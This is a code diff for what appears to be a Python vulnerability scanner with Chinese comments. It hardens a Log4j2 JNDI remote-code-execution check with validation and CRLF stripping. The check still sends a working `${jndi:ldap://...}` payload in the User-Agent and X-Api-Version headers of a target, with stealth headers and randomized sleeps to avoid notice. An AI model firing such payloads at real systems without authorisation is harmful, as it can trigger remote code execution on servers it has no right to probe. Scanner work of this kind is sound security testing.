@@ -251,18 +251,37 @@ def check_shiro_rce(url: str) -> Optional[Vulnerability]:
 
 
 def check_log4j2_oob(url: str) -> Optional[Vulnerability]:
-    """Log4j2 JNDI 远程代码执行 (OOB检测)"""
+    """
+    Log4j2 JNDI 远程代码执行 (OOB检测)
+    [修复] 验证OOB有效性，防止头部注入
+    """
     if not Config.OOB_ENABLED:
         return None
 
     try:
         unique_id, oob_url = oob.generate_payload()
+
+        # [修复] 检查OOB是否正确生成
+        if not unique_id or not oob_url:
+            logger.debug(f"  [-] OOB未配置或生成失败，跳过Log4j2检测")
+            return None
+
         payload = f"${{jndi:ldap://{oob_url}/a}}"
+
+        # [修复] 检查payload中是否包含危险字符（CRLF注入）
+        if '\n' in payload or '\r' in payload:
+            logger.debug(f"  [-] Payload包含CRLF字符，跳过")
+            return None
 
         smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
         headers = get_stealth_headers()
-        headers['X-Api-Version'] = payload
-        headers['User-Agent'] = payload
+
+        # [修复] 在设置头部前验证payload安全性
+        # HTTP头部不应该包含控制字符
+        safe_payload = payload.replace('\r', '').replace('\n', '')
+
+        headers['X-Api-Version'] = safe_payload
+        headers['User-Agent'] = safe_payload
 
         requests.get(
             url,
@@ -278,7 +297,7 @@ def check_log4j2_oob(url: str) -> Optional[Vulnerability]:
         if oob.verify(unique_id):
             return Vulnerability(
                 vuln_name="Log4j2 JNDI 远程代码执行",
-                payload_url=f"Header Injection: {payload}",
+                payload_url=f"Header Injection: {safe_payload}",
                 severity=Severity.CRITICAL,
                 vuln_type=VulnType.REMOTE_CODE_EXECUTION,
                 discovered_at=datetime.now().isoformat(),
